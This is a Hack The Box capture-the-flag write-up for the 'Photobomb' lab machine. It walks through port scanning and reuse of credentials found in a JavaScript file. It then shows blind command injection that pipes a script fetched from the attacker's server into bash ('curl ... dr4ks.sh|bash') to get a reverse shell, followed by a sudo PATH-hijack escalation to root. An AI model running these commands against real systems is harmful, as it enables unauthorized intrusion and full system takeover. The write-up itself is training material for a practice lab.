# [Photobomb](https://app.hackthebox.com/machines/photobomb)

```bash
nmap -p- --min-rate 10000 10.10.11.182 -Pn
```

![Alt text](img/image.png)


After knowing open ports, let's do greater nmap scan for this open ports.

```bash
nmap -A -sC -sV -p22,80 10.10.11.182
```

![Alt text](img/image-1.png)



I wrote this ip address into '/etc/hosts' file for resolving.

There's endpoint called '/printer' which asks HTTP authentication.

![Alt text](img/image-2.png)


I just review source code of application and found '**photobomb.js**' script.

I get sensitive credentials from here.

![Alt text](img/image-3.png)

pH0t0:b0Mb!


I will use this credentials for `/printer` endpoint.

![Alt text](img/image-4.png)


Now, I just try to download some image and capture this via `Proxy` to see network traffic.

That's POST request.

![Alt text](img/image-5.png)


Let's try command injection payloads. I type `sleep` cmdlet into here.

![Alt text](img/image-6.png)



It's Blind Command Injection, that's why I gain a webshell by requesting into my http server for reverse shell.

1.For this, I create malicious `.sh` file and serve via httpserver.
```bash
python3 -m http.server --bind 10.10.16.7 8080
```

![Alt text](img/image-7.png)


2.Second, I will `curl` this malicious file and run this via `bash` binary.
```bash
curl+10.10.16.7:8080/dr4ks.sh|bash
```

![Alt text](img/image-8.png)


Hola, I got reverse shell from port (1337).

![Alt text](img/image-9.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-10.png)


user.txt

![Alt text](img/image-11.png)


For privilege escalation, I just run `sudo -l` command.

![Alt text](img/image-12.png)


I read this file's content and see that `find` binary is used.

![Alt text](img/image-13.png)


Let's create ourselves malicious `find` binary which gives root shell. (`Path Hijack`)

```bash
cd /tmp
echo -e '#!/bin/bash\n\nbash' > find
chmod +x find
sudo PATH=$PWD:$PATH /opt/cleanup.sh 
```

![Alt text](img/image-14.png)


root.txt

![Alt text](img/image-15.png)